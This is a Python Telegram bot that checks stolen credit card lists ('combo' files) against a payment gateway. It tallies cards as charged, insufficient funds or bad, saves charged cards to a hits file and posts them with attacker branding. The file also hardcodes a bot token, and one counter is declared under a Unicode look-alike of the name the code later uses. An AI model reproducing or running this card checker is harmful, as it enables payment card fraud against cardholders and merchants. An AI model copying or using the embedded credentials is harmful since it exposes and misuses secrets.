import os,sys
import telebot
from telebot import types
from gate import check_cc
import random
import traceback


token = "7886528180:AAFLd7UYfCBDCwHkBOmLewsItCBasnj1was"
IDOWNER = 5983253591

a = True
bb = True
bot = telebot.TeleBot(token)


bot_username = bot.get_me().username
print(f" bot : @{bot_username}")
man_username = bot.get_chat(IDOWNER).username
print(f" user : @{man_username}")



@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == IDOWNER:
        idd = message.from_user.id
        first = message.from_user.first_name
        last = message.from_user.last_name
        if "None" in str(last):
            last = ""
        url = f"tg://user?id={idd}"
        bot.reply_to(message,
                   f"""hi  [{first + last}]({url}) 
Send Combo CC File""",
                   parse_mode="markdown")



@bot.message_handler(content_types=['document'])
def send_file(message):
    global a,bb
    if message.from_user.id == IDOWNER:
        if not bb:
            return bot.reply_to(message, text=f'Are you kidding me? One combo file is enough')
        insufficient_funds = 0
        𝚌𝚑𝚊𝚛𝚐𝚎 = 0
        Bad = 0
        try:
            file_input = bot.download_file(bot.get_file(message.document.file_id).file_path)
            with open(f"{message.document.file_name}", 'wb') as f:
                f.write(file_input)
        except:
            return bot.reply_to(message, text='File problem')
        mas = types.InlineKeyboardMarkup(row_width=1)
        h7am0 = types.InlineKeyboardButton('Hamo • حـمــو', url='https://t.me/aaka8h')
        mas.add(h7am0)
        alll = len(open(f"{message.document.file_name}","r").read().splitlines())
        lool = bot.reply_to(message, text=f'Checking Your Combo...⌛', reply_markup=mas)
        a = True
        bb = False
        for visaa in open(f"{message.document.file_name}","r").read().splitlines():
            if not a:
                a = False
                bb = True
                mesag = "stoped"
                ms = types.InlineKeyboardMarkup(row_width=1)
                messg = types.InlineKeyboardButton(f"- {mesag}.", callback_data="messg")
                ALA = types.InlineKeyboardButton(f"---------", callback_data="ALA")
                B = types.InlineKeyboardButton(f"- insufficient funds : {insufficient_funds}", callback_data="Fsi1")
                e = types.InlineKeyboardButton(f"- charge : {charge}", callback_data="Fsi1")
                z = types.InlineKeyboardButton(f"- Bad : {Bad}", callback_data="Fakz1")
                total = types.InlineKeyboardButton(f"- total : {alll}", callback_data="#")
                h7am0 = types.InlineKeyboardButton('Hamo • حـمــو', url='https://t.me/aaka8h')
                ms.add(messg,ALA,B, e, z,total, h7am0)
                return bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text="- Dev : @aaka8h ☠️ \n\n- Don't forget the screenshot 📸", reply_markup=ms)
            
            try:
                visa = visaa.split('|')
                numb = visa[0]
                if len(numb) != 16:
                    continue
                month = visa[1]
                year = visa[2]
                if len(year) == 4:
                    year = year[2:]
                if int(year) <= 23:
                    continue
                cvv = visa[3]
                if len(cvv) != 3:
                    continue
            except:
                continue
            try:
                response = check_cc(numb,month,year,cvv)
                status = response["status"]
                mesag = response["message"]

                pp2kp = "1 $"
                if status == "Error":
                    Bad += 1
                    print(f'\033[1;31m {visaa} \n {mesag}. {pp2kp}')
                    print('\033[0m ++++++++++++++++++++++++++++++++')
                    ms = types.InlineKeyboardMarkup(row_width=1)
                    messg = types.InlineKeyboardButton(f"- {mesag}.", callback_data="messg")
                    ALA = types.InlineKeyboardButton(f"- {visaa}", callback_data="ALA")
                    B = types.InlineKeyboardButton(f"- insufficient funds : {insufficient_funds}", callback_data="Fsi1")
                    e = types.InlineKeyboardButton(f"- charge : {charge}", callback_data="Fsi1")
                    z = types.InlineKeyboardButton(f"- Bad : {Bad}", callback_data="Fakz1")
                    total = types.InlineKeyboardButton(f"- total : {alll}", callback_data="#")
                    stop = types.InlineKeyboardButton(f" • STOP • ", callback_data=f"stop1:{message.from_user.id}")
                    h7am0 = types.InlineKeyboardButton('Hamo • حـمــو', url='https://t.me/aaka8h')
                    ms.add(messg,ALA,B, e, z,total,stop, h7am0)
                    bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text="Wait for the charge, YA Hacker ☠️ \n Don't forget the screenshot 📸", reply_markup=ms)
                elif status == "False":
                    insufficient_funds += 1
                    print(f'\033[1;32m {visaa} \n {mesag}. {pp2kp}')
                    print('\033[0m ++++++++++++++++++++++++++++++++')
                    hamo = f"""｢𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍 ⤈ Hamo - حـمــو |🇪🇬 」

◎ 𝚌𝚌 ➾ <code>{visaa}</code>
◎ 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ➾ {pp2kp}
◎ 𝚛𝚎𝚜𝚞𝚕𝚝 ➾ {mesag} .✅

ღ 𝙱𝚈 ➣ @aaka8h
    """
                    bot.send_message(message.chat.id,f"{hamo}",parse_mode='html')
                    ms = types.InlineKeyboardMarkup(row_width=1)
                    messg = types.InlineKeyboardButton(f"- {mesag}.", callback_data="messg")
                    ALA = types.InlineKeyboardButton(f"- {visaa}", callback_data="ALA")
                    B = types.InlineKeyboardButton(f"- insufficient funds : {insufficient_funds}", callback_data="Fsi1")
                    e = types.InlineKeyboardButton(f"- charge : {charge}", callback_data="Fsi1")
                    z = types.InlineKeyboardButton(f"- Bad : {Bad}", callback_data="Fakz1")
                    total = types.InlineKeyboardButton(f"- total : {alll}", callback_data="#")
                    stop = types.InlineKeyboardButton(f" • STOP • ", callback_data=f"stop1:{message.from_user.id}")
                    h7am0 = types.InlineKeyboardButton('Hamo • حـمــو', url='https://t.me/aaka8h')
                    ms.add(messg,ALA,B, e, z,total,stop, h7am0)
                    bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text="Wait for the charge, YA Hacker ☠️ \n Don't forget the screenshot 📸", reply_markup=ms)
                elif status == "True":
                    charge += 1
                    with open('hits.txt','a',encoding="utf-8") as ffff:
                        ffff.write(f"{visaa} \n {mesag}. {pp2kp} \n\n\n")
                    print(f'\033[1;32m {visaa} \n {mesag}. {pp2kp}')
                    print('\033[0m ++++++++++++++++++++++++++++++++')
                    hamo = f"""｢ 𝚌𝚑𝚊𝚛𝚐𝚎 ⤈ Hamo - حـمــو |🇪🇬 」

◎ 𝚌𝚌 ➾ <code>{visaa}</code>
◎ 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ➾ {pp2kp}
◎ 𝚛𝚎𝚜𝚞𝚕𝚝 ➾ {mesag} .✅

ღ 𝙱𝚈 ➣ @aaka8h
                    """
                    bot.send_message(message.chat.id,f"{hamo}",parse_mode='html')
                    ms = types.InlineKeyboardMarkup(row_width=1)
                    messg = types.InlineKeyboardButton(f"- {mesag}.", callback_data="messg")
                    ALA = types.InlineKeyboardButton(f"- {visaa}", callback_data="ALA")
                    B = types.InlineKeyboardButton(f"- insufficient funds : {insufficient_funds}", callback_data="Fsi1")
                    e = types.InlineKeyboardButton(f"- charge : {charge}", callback_data="Fsi1")
                    z = types.InlineKeyboardButton(f"- Bad : {Bad}", callback_data="Fakz1")
                    total = types.InlineKeyboardButton(f"- total : {alll}", callback_data="#")
                    stop = types.InlineKeyboardButton(f" • STOP • ", callback_data=f"stop1:{message.from_user.id}")
                    h7am0 = types.InlineKeyboardButton('Hamo • حـمــو', url='https://t.me/aaka8h')
                    ms.add(messg,ALA,B, e, z,total,stop, h7am0)
                    bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text="Wait for the charge, YA Hacker ☠️ \n Don't forget the screenshot 📸", reply_markup=ms)

                                
                            
            except Exception as eee:
                error_message = traceback.format_exc()
                Bad += 1
                ms = types.InlineKeyboardMarkup(row_width=1)
                messg = types.InlineKeyboardButton(f"- {eee}", callback_data="messg")
                ALA = types.InlineKeyboardButton(f"---------", callback_data="ALA")
                B = types.InlineKeyboardButton(f"- insufficient funds : {insufficient_funds}", callback_data="Fsi1")
                e = types.InlineKeyboardButton(f"- charge : {charge}", callback_data="Fsi1")
                z = types.InlineKeyboardButton(f"- Bad : {Bad}", callback_data="Fakz1")
                total = types.InlineKeyboardButton(f"- total : {alll}", callback_data="#")
                stop = types.InlineKeyboardButton(f" • STOP • ", callback_data=f"stop1:{message.from_user.id}")
                h7am0 = types.InlineKeyboardButton('Hamo • حـمــو', url='https://t.me/aaka8h')
                ms.add(messg,ALA,B, e, z,total, h7am0)
                bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text="Wait for the charge, YA Hacker ☠️ \n Don't forget the screenshot 📸", reply_markup=ms)
                print(f"\033[33m {error_message}")
                print('\033[0m ++++++++++++++++++++++++++++++++')
        a = False
        bb = True
        mesag = "done check"
        ms = types.InlineKeyboardMarkup(row_width=1)
        messg = types.InlineKeyboardButton(f"- {mesag}.", callback_data="messg")
        ALA = types.InlineKeyboardButton(f"---------", callback_data="ALA")
        B = types.InlineKeyboardButton(f"- insufficient funds : {insufficient_funds}", callback_data="Fsi1")
        e = types.InlineKeyboardButton(f"- charge : {charge}", callback_data="Fsi1")
        z = types.InlineKeyboardButton(f"- Bad : {Bad}", callback_data="Fakz1")
        total = types.InlineKeyboardButton(f"- total : {alll}", callback_data="#")
        h7am0 = types.InlineKeyboardButton('Hamo • حـمــو', url='https://t.me/aaka8h')
        ms.add(messg,ALA,B, e, z,total, h7am0)
        return bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text="- Dev : @aaka8h ☠️ \n\n- Don't forget the screenshot 📸", reply_markup=ms)





@bot.callback_query_handler(func=lambda call: True)
def calling(call):
    global a,bb
    user_id = call.from_user.id
    if call.data == f'stop1:{user_id}':
        a = False
        bb = True

print("""


   bot run ...
   enjoy""")

try:
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
except (ConnectionError) as e:
    sys.stdout.flush()
    os.execv(sys.argv[0], sys.argv)
else:
    bot.infinity_polling(timeout=25, long_polling_timeout=10)
